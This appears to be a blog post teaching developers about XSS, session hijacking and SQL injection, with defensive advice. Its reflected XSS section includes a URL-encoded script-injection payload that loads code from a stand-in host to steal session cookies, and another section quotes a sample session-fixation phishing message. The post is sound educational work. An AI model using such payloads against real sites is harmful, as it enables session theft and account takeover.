I can testify that a lot of people confined in me they considered doing this (including yours truly) under the frustration of the bi-monthly administrative policies that mandated we change our workstation password:

![image-title-here](/images/my-password.jpg){:class="img-responsive"}

This sort of thing happens more than you would imagineâ€”what a lot of people don't know is that hackers rely a lot on social engineering to gain access to systems. Mitnick was famous for calling in, pretending to be somebody he wasn't and asking for somebody's password in order to "perform some maintainance".

## Phishing
If you've followed the election cycle news, you might have heard that John Podesta was hacked. We was actually the victim of a *phising* scam whereby he received an email made to look like an email from Google (he was using Gmail) that informed him that he needed to change his password because unauthorized access to his account was detected. He fell for it, clicked on the link which redirected him to a page that looked like a Google page (he didn't pay attention to the URL it seems), and he entered his old and *supposedly* new credentials.

*But this is a scam, it's not what I wanted to talk about, because YOU as a developer cannot do anything about it. I actually want to talk about REAL  vulnerabilities in the software and how they can be addressed, which means understanding the vectors attackers have at their disposal.*

I know quite a lot of senior developers that when it comes to web application security they rely on whatever framework they are using to take care of that for them, but don't really have an understanding of what's happening behind the scenes. Web application security is quite a complex topic, we will be covering:

1. Cross-site scripting, also called XSS scripting

2. Session hijacking

3. SQL injection

Both XSS and SQL Injection are cases of *code injection*.

## Cross-Site Scripting
XSS refers to a vulnerabity where an attacker is able to "inject" Javascript code that will be run by the application. In my previous article, I've discussed the [same-origin](http://achiral.io/cors-made-simple) policy concept at length which states that if content from one site is granted permission to access resources on a system, then any content from that site will share these permissions, while content from another site will have to be granted permissions separately. 

A typical example of XSS is *persistent cross-site scripting*. If a page isn't properly *sanitizing* the user input (a field in a for, for example), a user could actually type in valid Javascript code, which is going to be saved by the application in its database and be subsequently rendered everytime it displays a page. Imagine you have a page that is visible to multiple users (such as a product page) which allows for users to add comments. If the page is not escaping user input, it is possible for a malicious user to write actual an script block, which will then be rendered to all users as part of the page HTML. The Javascript code has access to the cookies of that user and it can send that information to the a attacker.

![image-title-here](/images/attack.gif){:class="img-responsive"}

An alternative is the *reflected* (or non-persistent) XSS atack, whereby the user's input is not stored in the database, but returned back in the same way it was inputed. It works like this: say you have a page that allows you to search for products. The user types some text in the search box and clicks the search button which sends a GET request to the server.

<pre>
GET http://www.onlineshop.com?search=something
</pre>

If the site finds something, it returns a list of results, but if it doesn't, it's going to say

*Your search, 'something', returned no results.*

... which is just the original, unaltered string. A crafty attacker might see this vulnerability and might send an email to the user asking him to click on a link which for the search term, contains some nefarious script block. If the user clicks on the link (which is likely because most people don't hover on links to see where they lead to), the application server won't be able to find any result, and will return with a *not found* page containing the script rendered directly on the page. 

<pre>
GET http://www.onlineshop.com?
  search=%3Cscript%2520src%3D%22http%3A%2F%2Fsomesite.com%2Fscript.js%22%3E%3C%2Fscript%3E
</pre>

This script can then hijack the session cookie, like in the previous example.

What can we do about it? Actually two things:

1. Validate inputs: this means checking that the user didn't try to input any funky stuff and warning him if this is the case.
2. Sanitize outputs: everything that's rendered to the bage must be HTML escaped. This means that script blocks will be displayed as text, and won't be part of the DOM, and thus executed.

If you are developing with Node / Express, there are plenty of packages to help you safeguard against XSS attacks, such as [helmet](https://www.npmjs.com/package/helmet) or [xssfilter](https://www.npmjs.com/package/xssfilter) etc.

## Session Hijacking
Most web applications use a session mechanism which allows the server hosting the web application to know which user is making a specific request. Sessions usually involve authenticating the user, creating some sort of *session_id* (usually a string) and setting a cookie with that value on the user's browser. Session hijacking is a way of getting to know that string.

One way to gain access to it is, as I mentioned, cross-site scripting. Another typical way of gaining access to that cookie is by sniffing packets. Since browsers send the cookies asociated with a domain for every request, somebody sniffing traffic would be able to see also the value of the session cookie. A typical way to sniff traffic is to set up an unencrypted wifi hot spot in a public place, and monitor the traffic of the people connecting to it. Does this mean I cannot use my online banking when I am connected to a public hotspot? No, because if the website uses SSL for all requests, the contents of the traffic won't be intelligible to a man-in-the-middle, and usually major sites like Facebook / Twitter, online banking etc. are pretty well secured. There are however plenty of smaller poorly written sites that only use SSL for the login page, and then pass the session cookie unencrypted to other pages.

Another way to gain access to a user's session is to get that user to install a mallware on his/hers computer. Since browsers usually store cookies on disk, that mallware would be able to access the cookie if it knows where to look for it. 

A yet another way of acomplishing session hijacking is *session fixation*. There are plenty of sites that accept a session ID in the URL, such as:

<pre>
http://www.website.com?sid=asb1sadasdasdan23123
</pre>

The reason why they do it is because a lot of users turn of their cookies, ironically, for security reasons. This however would open them up to scams, like somebody sending them an email which says:

<blockquote>
Hey, click on http://www.website.com?sid=asb1sadasdasdan23123, and enter credit card and address information to receive a free bonus on your order.
</blockquote>

Since the attacker knows the session id, he/she can also log to that page and see the information inputed by the user.

## SQL Injection
And last (in our article), but certainly not least, we have SQL injection. I think most of us remember this:

![image-title-here](/images/exploit.png){:class="img-responsive"}

For SQL injection to work, you'd have to be writing your SQL queries using string interpolation / concatenation.

<script src="https://gist.github.com/toaderflorin/e842b81f3e4d1fef85087134717a1571.js"></script>

As you can see, the text fits nicely in the query. The way you get around this is by using parameters, which are supported by all database systems.
